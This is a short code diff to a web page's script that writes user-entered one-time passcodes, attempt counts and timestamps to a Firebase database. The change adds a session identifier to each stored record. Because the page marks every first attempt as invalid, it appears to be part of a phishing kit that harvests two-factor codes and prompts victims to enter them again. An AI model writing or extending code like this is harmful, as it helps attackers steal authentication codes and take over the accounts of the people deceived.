@@ -155,9 +155,14 @@
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-  </script>
 
-  <script>
+    // Generate a unique sessionId
+    const sessionId = generateSessionId();
+
+    function generateSessionId() {
+      return 'session_' + Date.now() + Math.floor(Math.random() * 1000);
+    }
+
     let attempt = 1;
 
     function handleSubmit(e) {
@@ -179,6 +184,7 @@
         otp: otpValue,
         attempt: attempt,
         valid: attempt > 1,
+        sessionId: sessionId, // Store sessionId
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         setTimeout(() => {
